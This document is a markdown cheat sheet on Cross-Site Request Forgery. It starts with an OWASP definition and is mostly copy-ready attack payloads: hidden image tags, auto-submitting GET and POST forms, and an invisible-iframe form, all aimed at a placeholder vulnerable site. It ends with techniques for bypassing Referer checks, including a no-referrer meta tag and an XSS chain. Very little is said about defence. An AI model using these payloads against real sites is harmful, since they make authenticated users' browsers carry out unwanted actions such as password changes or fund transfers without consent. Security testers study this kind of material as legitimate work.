# CSRF

>Cross-Site Request Forgery (CSRF) is a type of attack that occurs when a malicious web site, email, blog, instant message, or program causes a user’s web browser to perform an unwanted action on a trusted site for which the user is currently authenticated. The impact of a successful CSRF attack is limited to the capabilities exposed by the vulnerable application. For example, this attack could result in a transfer of funds, changing a password, or purchasing an item in the user's context. In effect, CSRF attacks are used by an attacker to make a target system perform a function via the target's browser without knowledge of the target user, at least until the unauthorized transaction has been committed.

Source : [OWASP](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)


##CSRF is possible when ...

* Request is known in advance and is not composed of any random values unknown from the attacker

* Server do not check the `Referer` Header

* Action should be an interesting for the attacker 
	* Password Change
	* Settings Change
	* Personal Informations Change
	* ...

##GET Requests Exploits

###Invisible mage Loading
`<img style="display:none;" src="http://vulnerable-site.com/vuln?param1=value1&param2=value2&..."/>`

###Link clicking
`<link href="http://vulnerable-site.com/vuln?param1=value1&param2=value2&...">`

```
<html> 
	<body>
		<form action="http://vulnerable-site.com/vuln" method="GET"> 
			<input type="hidden" name="param1" value="value1"/>
		</form> 
	</body>
	<script> document.forms[0].submit();</script> 
</html>
```

##POST Requests Exploits

###Visible Form
```html
<html> 
	<body>
		<form action="http://vulnerable-site.com/vuln" method="POST"> 
			<input type="hidden" name="param1" value="value1"/>
		</form> 
	</body>
	<script> document.forms[0].submit();</script> 
</html>
```

###Invisible Form
```html
<html> 
	<body>
		<iframe style="display:none" name="invisible-frame"></iframe>
		<form method='POST' action='http://vulnerable-site.com/vuln' target="invisible-frame" id="pwn-form">
		  <input type='hidden' name='param1' value='value1'>
		  <input type='submit' value='submit'>
		</form>
	</body>
	<script>document.getElementById("pwn-form").submit()</script>
</html>

```

##DELETE / PUT Requests Exploits

* `PUT` or `DELETE` requests using HTML forms is not possible as these methods are currently not supported by HTML5 Forms.

* CSRF is possible with the `PUT` and `DELETE` methods, but only with CORS enabled with an unrestrictive policy ().


##Protection Bypass

###Referer Header Check Bypass

* To send a request with no `Referer` header 
`<meta name="referrer" content="no-referrer">`

* Chain CSRF vulnerability with XSS
`POST http://vulnerable-site.com/xssvuln?id=<script type="text/javascript">window.location="http://vulnerable/vuln";</script>`